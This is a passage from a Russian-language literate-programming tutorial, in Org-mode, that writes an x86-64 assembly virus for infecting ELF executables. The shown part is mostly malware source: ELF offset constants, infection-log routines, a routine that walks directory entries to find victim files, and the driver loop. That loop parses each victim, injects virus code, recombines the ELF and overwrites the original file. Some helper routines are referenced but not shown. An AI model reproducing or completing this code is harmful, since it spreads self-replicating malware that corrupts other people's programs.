  dynamic_records_addr:
      .quad 0

  new_bind_now_flag_record_size:
      .quad 0

  new_bind_now_record_frm_dynamic_offset:
      .quad 0

  original_e_entry:
      .quad 0

  offset_to_e_entry:
      .quad 0

  move_victim_offset:
      .quad 0

  offset_to_e_entry_frm_file_begin:
      .quad 0

  frm_orig_e_entry_to_virus_e_entry_offset:
      .quad 0

  offset_to_vict_code_frm_file_begin:
      .quad 0

  sh_name_indx:
      .long 0

  first_seg_vaddr:
      .quad 0

  first_seg_addr:
      .quad 0

  GOT_vaddr:
      .quad 0

  GOT_size:
      .quad 0

  GOT_addr_in_memory:
      .quad 0

  rela_section_offset:
      .quad 0

  rela_section_size:
      .quad 0

  data_block:
      .space 0x50, 0

  cur_seg_addr:
      .quad 0

  cur_seg_end_addr:
      .quad 0

  cur_seg_hdr_ptr:
      .quad 0

  cur_seg_memsz:
      .quad 0

  file_sz:
      .quad 0

  clear_to:
      .quad 0

#+END_SRC

Так же ввеем константы, которые значительно облегчат нам жизнь при
доступе к структурам заголовков, блоку данных жертвы, а так же
предоставят возможность указывать ~openfile~, ~open~ и ~mmap~ с какими
правами файл должен быть открыт.

#+NAME: consts
#+BEGIN_SRC asm
      .set O_RDONLY, 0x0
      .set O_RDWR, 0x2
      .set MAP_PRIVATE, 0x2
      .set PROT_NONE, 0x0
      .set PROT_READ, 0x1
      .set PROT_WRITE, 0x2
      .set PROT_EXEC, 0x4
      .set PROT_READ_OR_PROT_WRITE, 0x3
      .set O_RDWR_AND_O_APPEND, 0x402

      .set ELF_E_ENTRY, 0x18
      .set ELF_E_PHOFF, 0x20
      .set ELF_E_SHOFF, 0x28
      .set ELF_E_PHNUM, 0x38
      .set ELF_E_SHNUM, 0x3c

      .set PHDR_P_OFFSET, 0x8
      .set PHDR_P_VADDR, 0x10
      .set PHDR_P_PADDR, 0x18
      .set PHDR_P_FILESZ, 0x20
      .set PHDR_P_MEMSZ, 0x28
      .set PHDR_P_ALLIGN, 0x30

      .set SHDR_SH_ADDR, 0x10
      .set SHDR_SH_TYPE, 0x4
      .set SHDR_SH_OFFSET, 0x18
      .set SHDR_SH_SIZE, 0x20

      .set FIRST_SEGM_VADDR, 0xB
      .set VIRUS_NEW_VADDR, 0x13
      .set OFFSET_TO_E_ENTRY_FRM_FILE_BEGIN, 0x1b
      .set ORIG_E_ENTRY_VADDR, 0x23
      .set FRM_ORIG_E_ENTRY_TO_VIRUS_E_ENTRY, 0x2b
      .set VICTIM_CODE_OFFSET, 0x33
      .set NEW_BIND_NOW_FLAG_RECORD_SIZE, 0x3b
      .set DYNAMIC_REC_VADDR, 0x43
      .set DYNAMIC_REC_SZ, 0x4b
      .set DYNAMIC_RECORDS_OFFSET, 0x53

#+END_SRC

Еще нам хотелось бы иметь лог заражения - какие файлы вирус пытался
заразить.

#+NAME: _print_infection_log
#+BEGIN_SRC asm
  /// Печатает имя файла,
  /// который пытается заразить вирус в
  /// данный момент
  _print_infection_log:
      push     %rsi
      push     %rdi
      push     %rdx

      mov      file_name_ptr(%rip), %rsi
      test     %rsi, %rsi
      je       _print_infection_log_fail

      mov      file_name_ptr(%rip), %rdi
      call     _my_strlen

      mov      string_length(%rip), %rdx
      test     %rdx, %rdx
      je       _print_infection_log_fail

      call    _my_write

      lea     _msg_cur_infection(%rip), %rsi
      mov     $0x16, %rdx
      call    _my_write

      xor     %rax, %rax
      jmp     _print_infection_log_exit
  _print_infection_log_fail:
      mov     $-1, %rax

  _print_infection_log_exit:
      pop     %rdx
      pop     %rdi
      pop     %rsi
      ret

#+END_SRC

И выводить сообщение об успехе заражения.

#+NAME: _print_success_infection_msg
#+BEGIN_SRC asm
  /// _PRINT_SUCCESS_INFECTION_MSG
  /// Печатает вывод об успешном инфицировании файла
  _print_success_infection_msg:
      push     %rsi
      push     %rdi
      push     %rdx

      mov      file_name_ptr(%rip), %rsi
      test     %rsi, %rsi
      je       _print_success_infection_msg_fail

      mov      file_name_ptr(%rip), %rdi
      call     _my_strlen

      mov      string_length(%rip), %rdx
      test     %rdx, %rdx
      je       _print_infection_log_fail

      call    _my_write

      lea     _msg_infection_success(%rip), %rsi
      mov     $0x1b, %rdx
      call    _my_write

      xor     %rax, %rax
      jmp     _print_success_infection_msg_exit

  _print_success_infection_msg_fail:
      mov     $-1, %rax

  _print_success_infection_msg_exit:
      pop     %rdx
      pop     %rdi
      pop     %rsi
      ret

#+END_SRC

Помните, мы считывали все записи файлов из каталога с помощью ~readdir~ в
буфер? Теперь самое время научиться извлекать имена этих файлов из
записей. Сделать это нетрудно: имя лежит по определенному смещению от
начала записи файла.
Интересная штука в другом - все эти записи разного размера, поскольку
содержат в себе строку-имя, а не указатель на эту строку. Поэтому мы так
же считываем размер это записи, увеличиваем указатель на запись в буфере
на размер текущей записи, и таким образом получаем указатель на следующую
запись.

~get_file_name~ так же проверяет, не кончились ли у нас записи файлов:
это сделать довольно леко - имя файла не должно быть заполнено нулями.
Если это так, то ~get_file_name~ возвращает ~fail~ и мы прекращаем искать
новые файлы для заражения.

#+NAME: _get_file_name
#+BEGIN_SRC asm
  /// Проверяет: указатель на текущую запись
  /// Успех: заполняет cur_filename указателем на
  /// имя и возвращает 0 в rax
  /// Фейл: заполняет cur_filename нулем и
  /// возвращает -1 в rax
  _get_file_name:
      push    %rbx
      push    %rcx

      // указатель не нулевой?
      mov     dir_buf_ptr(%rip), %rbx
      test    %rbx, %rbx
      je      _get_file_name_fail

      // получили имя
      lea     0x12(%rbx), %rax
      mov     %rax, file_name_ptr(%rip)
      mov     (%rax), %rax
      test    %rax, %rax
      je      _get_file_name_fail


      xor     %rcx, %rcx
      // получили размер текущей структуры
      // (он меняется)
      movzwl  0x10(%rbx), %ecx
      // сдвинули указатель на
      // следующую структуру
      add     %rcx, %rbx

      mov     %rbx, dir_buf_ptr(%rip)
      xor     %rax, %rax
      jmp    _get_file_name_exit

  _get_file_name_fail:
      mov     $-1, %rax
      movq    $0x0, file_name_ptr(%rip)

  _get_file_name_exit:
      pop     %rcx
      pop     %rbx
      ret

      ERR_MSG _get_file_name "get_file_name: No files in directory any more"

#+END_SRC

Заведем себе дополнительную функцию выхода из вируса - она работает точно
так же как ~_global_exit~, но будет вызываться из инфицированной жертвы в
случае, если с вирусом случилось что-то не то.

#+NAME: _exit_virus
#+BEGIN_SRC asm
  /// _EXIT_VIRUS
  /// Аварийный выход из вируса
  _exit_virus:
      mov $0x3c, %rax
      mov $0x0,  %rdi
      syscall

#+END_SRC

Теперь соберем это все в ~start_infector~, который является по факту
~driver loop~ вируса.

Алгоритм предельно простой:
- разрешаем вирусу самомодификацию
- сохраняем регистры
- устанавливаем в перменные значения по умолчанию
- открываем текущий каталог и считываем из него все записи о файлах и
  каталогах
- пробуем получить имя файла. Если не удалось, то подтавливаем выход и
  выходим из вируса.
- затем открываем жертву и пробуем ее распарсить. Если ~parse_victim~
  вернет ~fail~, то мы попробуем взять новое имя жертвы и распарсить
  ее. И так до тех пор, пока они не кончатся.
- если парсинг удался, вытаскиваем код вируса
- если с кодом вируса все прошло успешно, занимаемся пересчитываем жертвы
  и генерированием новых заголовков и прочего. Если этот этапе сфейлился,
  то подготавливаем выход вируса и выходим.
- если и с пересчетом все прошло хорошо, то перекомбинируем эльф
- если эльф удалось перекомпилировать, переписываем весь код из
  промежуточного файла в тот, что планировали заразить изначально
- печатаем сообщение об успешном заражении
- восстанавливаем значание регистров
- выход

#+NAME: _start_infector
#+BEGIN_SRC asm
  /// _START_INFECTOR
  /// старт инфектора
  _start_infector:
      call    _allow_write_into_code

      jmp     _save_registers

  _prepare_data:
      call    _clear_old_data
      // test    %rax, %rax
      // jne     _global_exit

      call    _my_readdir

  _get_victim_name:
      call    _get_file_name
      test    %rax, %rax
      jne     _restore_registers_and_stack

      call    _print_infection_log

      call    _parse_victim
      test    %rax, %rax
      jnz     _get_victim_name

      call    _get_virus_code

      call    _recount_victim
      test    %rax, %rax
      jne     _restore_registers_and_stack

      call    _open_interm_file
      test    %rax, %rax
      jne     _restore_registers_and_stack

      call    _recombine_elf
      test    %rax, %rax
      jne     _restore_registers_and_stack

      call    _rewrite_to_victim_file
      test    %rax, %rax
      jne     _restore_registers_and_stack

      call    _print_success_infection_msg

#+END_SRC

И обозначим конец кода вируса - нам нужна эта метка, чтоб определить размер
кода вируса при вызове ~mprotect~.

#+NAME: _fin_infector
#+BEGIN_SRC asm
  _fin_infector:
      nop

#+END_SRC

** Сборка проекта

#+NAME: tangle
#+BEGIN_SRC asm :tangle virus_code.s :noweb tangle :exports code :padline no :comments none
  << _start >>
#+END_SRC
